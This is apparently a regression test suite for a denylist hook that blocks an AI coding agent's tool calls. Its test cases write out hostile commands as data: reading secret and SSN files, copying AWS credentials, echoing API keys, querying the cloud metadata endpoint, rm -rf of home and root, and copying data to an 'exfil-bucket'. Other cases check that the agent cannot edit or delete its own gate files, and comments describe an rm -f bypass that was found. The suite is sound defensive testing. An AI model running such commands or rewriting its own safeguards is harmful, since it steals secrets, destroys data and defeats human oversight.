#!/usr/bin/env python3
"""test-denylist.py - regression suite for the H2 denylist floor (scripts/hooks/denylist.py).

Pipes crafted preToolUse hook events to denylist.py and asserts exit code:
  exit 2 = BLOCK, exit 0 = ALLOW.
Positive controls (must block) + negative controls (must NOT block, no false positives)
+ log-tier controls (matched but must not block) + kill-switch control.
Run: python3 scripts/hooks/test-denylist.py   (exit 0 = all pass)
"""
import datetime
import json
import os
import subprocess
import sys
import tempfile

HOOK = os.path.join(os.path.dirname(__file__), "denylist.py")
LOGTMP = os.path.join(tempfile.gettempdir(), "denylist-test.jsonl")

# Grant isolation. denylist.main() consults an owner grant file whose default path is
# ~/.nathaniel/gate-grant.json. Without overriding it, a LIVE owner grant leaks into every
# case and silently converts expected-BLOCK results into passes. Observed 2026-09-14: an
# active KS-KEYSTONE grant flipped 5 cases to "allowed by owner grant", which means a suite
# run during any grant window would MISS a genuine keystone regression. Every baseline case
# therefore points at a path that cannot exist, so grant state can never affect the baseline.
GRANT_ABSENT = os.path.join(tempfile.gettempdir(), "denylist-test-grant-absent-dir", "gate-grant.json")


def ev(tool, ti):
    return {"hook_event_name": "preToolUse", "tool_name": tool, "tool_input": ti}


def bash(cmd):
    return ev("execute_bash", {"command": cmd})


def fsread(path):
    return ev("fs_read", {"operations": [{"mode": "Line", "path": path}]})


def fswrite(path):
    return ev("fs_write", {"path": path})


def useaws(service, operation, extra=None):
    d = {"service": service, "operation": operation}
    if extra:
        d.update(extra)
    return ev("use_aws", d)


# (name, event, mode, expected_exit)
CASES = [
    # --- POSITIVE controls: must BLOCK (exit 2) in enforce mode ---
    ("secret bash cat",        bash('cat "Life/.secrets/company-credentials/aws.txt"'), "enforce", 2),
    ("secret fs_read",         fsread("Life/.secrets/identity/ssn.txt"),                "enforce", 2),
    ("ssh key fs_write",       fswrite(os.path.expanduser("~/.ssh/id_rsa")),            "enforce", 2),
    ("aws creds bash",         bash('cp ~/.aws/credentials /tmp/x'),                    "enforce", 2),
    ("env cred echo",          bash('echo $AWS_SECRET_ACCESS_KEY'),                     "enforce", 2),
    ("kiro key echo",          bash('echo "$KIRO_API_KEY"'),                            "enforce", 2),
    ("imds curl",              bash('curl http://169.254.169.254/latest/meta-data/'),  "enforce", 2),
    ("rm -rf home",            bash('rm -rf ~'),                                        "enforce", 2),
    ("rm -rf root",            bash('rm -rf /'),                                        "enforce", 2),
    ("rm -rf secrets",         bash("rm -rf Life/.secrets"),                            "enforce", 2),
    ("ledger self-protect",    bash('cat ~/.kiro/nate-audit.jsonl'),                    "enforce", 2),
    ("hmac key self-protect",  bash('cat ~/.kiro/nate-audit-hmac.key'),                 "enforce", 2),
    ("find root",              bash('find / -name foo'),                                "enforce", 2),
    ("find subdir ok",         bash('find /home/user -name foo'),                     "enforce", 0),
    ("systemctl start ok",     bash('systemctl start nginx'),                           "enforce", 0),
    ("docker start ok",        bash('docker start web'),                                "enforce", 0),
    ("npm build ok",           bash('npm run build'),                                   "enforce", 0),
    ("npm dev (log-tier)",     bash('npm run dev'),                                     "enforce", 0),

    # --- #16 keystone: agent must not REWRITE its own gate (writes block, reads allow) ---
    ("keystone nate.json write",    fswrite(".kiro/agents/nate.json"),                  "enforce", 2),
    ("keystone v3 hook file write", fswrite(".kiro/hooks/safety-floor.json"),           "enforce", 2),
    ("keystone v3 hook file read",  fsread(".kiro/hooks/safety-floor.json"),            "enforce", 0),
    ("keystone denylist write",     fswrite("scripts/hooks/denylist.py"),               "enforce", 2),
    ("keystone audit_common write", fswrite("scripts/hooks/audit_common.py"),           "enforce", 2),
    ("keystone bash sed gate",      bash("sed -i 's/x/y/' scripts/hooks/denylist.py"),  "enforce", 2),
    ("keystone bash redirect gate", bash("echo x > .kiro/agents/nate.json"),            "enforce", 2),
    ("keystone read nate.json ok",  fsread(".kiro/agents/nate.json"),                   "enforce", 0),
    ("keystone cat denylist ok",    bash("cat scripts/hooks/denylist.py"),              "enforce", 0),
    ("keystone off allows gate",    fswrite("scripts/hooks/denylist.py"),               "off",     0),
    ("keystone read 2>&1 ok",       bash("python3 -m json.tool .kiro/agents/nate.json 2>&1"), "enforce", 0),
    ("keystone read arrow ok",      bash("echo 'step -> denylist.py' && cat scripts/hooks/denylist.py"), "enforce", 0),
    ("keystone bash append gate",   bash("echo x >> scripts/hooks/denylist.py"),        "enforce", 2),

    # --- DELETION is a gate-state change too (found 2026-09-14). rm is absent from
    # --- GATE_WRITE_VERB_RE and RMRF_RE requires BOTH -r and -f, so `rm -f <gate>` matched
    # --- no rule at all. These six fail until `\brm\b` is added to GATE_WRITE_VERB_RE and
    # --- preflight/source-authority are added to GATE_PATH_RE.
    ("keystone rm gate code",       bash("rm -f scripts/hooks/denylist.py"),            "enforce", 2),
    ("keystone rm gate wiring",     bash("rm -f .kiro/agents/nate.json"),               "enforce", 2),
    ("keystone rm plain no flags",  bash("rm scripts/hooks/audit_log.py"),              "enforce", 2),
    ("keystone rm armed sag",       bash("rm -f scripts/hooks/source-authority.py"),    "enforce", 2),
    ("keystone preflight write",    fswrite("scripts/hooks/preflight.py"),              "enforce", 2),
    ("keystone sag write",          fswrite("scripts/hooks/source-authority.py"),       "enforce", 2),
    # controls: the rm guard must be word-bounded and gate-scoped, not a blanket rm ban
    ("rm unrelated file ok",        bash("rm -f /tmp/scratch.txt"),                     "enforce", 0),
    ("npm is not rm ok",            bash("npm run build && cat scripts/hooks/denylist.py"), "enforce", 0),
    ("confirm is not rm ok",        bash("echo confirm && cat scripts/hooks/denylist.py"),  "enforce", 0),

    # --- NEGATIVE controls: must ALLOW (exit 0), no false positives ---
    ("ls",                     bash('ls -la'),                                          "enforce", 0),
    ("git status",             bash('git status'),                                      "enforce", 0),
    ("cat readme",             bash('cat README.md'),                                   "enforce", 0),
    ("grep kb",                bash('grep -r foo "Nate\'s-kb"'),                        "enforce", 0),
    ("python script",          bash('python3 scripts/save-session.py x.json'),          "enforce", 0),
    ("fs_read readme",         fsread("README.md"),                                     "enforce", 0),
    ("fs_write dev",           fswrite("Development/foo.py"),                            "enforce", 0),
    ("rm tmp file",            bash('rm /tmp/foo.txt'),                                  "enforce", 0),
    ("rm -rf tmp build",       bash('rm -rf /tmp/build'),                               "enforce", 0),
    ("rm -rf node_modules",    bash('rm -rf node_modules'),                             "enforce", 0),
    ("echo benign",            bash('echo "deployment complete"'),                      "enforce", 0),
    ("cat env example",        bash('cat .env.example'),                                "enforce", 0),
    ("use_aws s3 read",        useaws("s3", "ListBuckets"),                             "enforce", 0),

    # --- LOG-tier controls: rule MATCHES but must NOT block (exit 0) ---
    ("s3 exfil bash (log)",    bash('aws s3 cp ./data.csv s3://exfil-bucket/'),         "enforce", 0),
    ("s3 exfil useaws (log)",  useaws("s3", "PutObject", {"bucket": "exfil-bucket"}),   "enforce", 0),

    # --- KILL SWITCH: off mode allows even a blatant secret read ---
    ("kill switch off",        bash('cat "Life/.secrets/x"'),                           "off", 0),

    # --- LOG MODE: enforce-tier rule matches but global log mode never blocks ---
    ("log mode secret",        bash('cat "Life/.secrets/x"'),                           "log", 0),
]


def run():
    passed, failed = 0, 0
    fails = []
    for name, event, mode, expected in CASES:
        env = dict(os.environ, NATE_DENYLIST=mode, NATE_DENYLIST_LOG=LOGTMP,
                   NATE_GRANT_PATH=GRANT_ABSENT)
        r = subprocess.run([sys.executable, HOOK], input=json.dumps(event),
                           capture_output=True, text=True, env=env)
        ok = (r.returncode == expected)
        if ok:
            passed += 1
        else:
            failed += 1
            fails.append(f"  FAIL [{name}] mode={mode} expected exit {expected}, got {r.returncode} :: stderr={r.stderr.strip()}")
    print(f"denylist regression: {passed} passed, {failed} failed  ({len(CASES)} cases)")
    for line in fails:
        print(line)
    return 0 if failed == 0 else 1


def run_grant_integration():
    """Explicit coverage for the main() owner-grant seam.

    The baseline CASES deliberately isolate grants away, which means nothing there would catch
    the grant check being DELETED from main() -- it fails closed, so removal looks identical to
    working. These two checks close that hole using their own temp fixture; they never read the
    real grant path. Check 2 is the one that matters: it proves a grant scopes to the rule it
    names rather than behaving like a quiet NATE_DENYLIST=off.
    """
    passed, failed = 0, 0
    fails = []
    with tempfile.TemporaryDirectory() as td:
        gp = os.path.join(td, "gate-grant.json")
        exp = (datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=1)).isoformat()
        with open(gp, "w", encoding="utf-8") as f:
            json.dump({"scope": ["KS-KEYSTONE"], "expires": exp,
                       "reason": "suite integration check"}, f)
        checks = [
            ("grant allows the rule it names",     fswrite("scripts/hooks/denylist.py"), 0),
            ("grant does NOT leak to other rules", fswrite("Life/.secrets/x"),           2),
            ("expired grant does not allow",       fswrite("scripts/hooks/denylist.py"), 2),
        ]
        for i, (name, event, expected) in enumerate(checks):
            if name.startswith("expired"):
                stale = (datetime.datetime.now(datetime.timezone.utc)
                         - datetime.timedelta(minutes=1)).isoformat()
                with open(gp, "w", encoding="utf-8") as f:
                    json.dump({"scope": ["KS-KEYSTONE"], "expires": stale,
                               "reason": "suite integration check"}, f)
            env = dict(os.environ, NATE_DENYLIST="enforce", NATE_DENYLIST_LOG=LOGTMP,
                       NATE_GRANT_PATH=gp)
            r = subprocess.run([sys.executable, HOOK], input=json.dumps(event),
                               capture_output=True, text=True, env=env)
            ok = (r.returncode == expected)
            if ok:
                passed += 1
            else:
                failed += 1
                fails.append(f"  FAIL [grant: {name}] expected exit {expected}, got {r.returncode} :: stderr={r.stderr.strip()}")
    print(f"grant integration: {passed} passed, {failed} failed  ({passed + failed} checks)")
    for line in fails:
        print(line)
    return 0 if failed == 0 else 1


if __name__ == "__main__":
    sys.exit(run() | run_grant_integration())
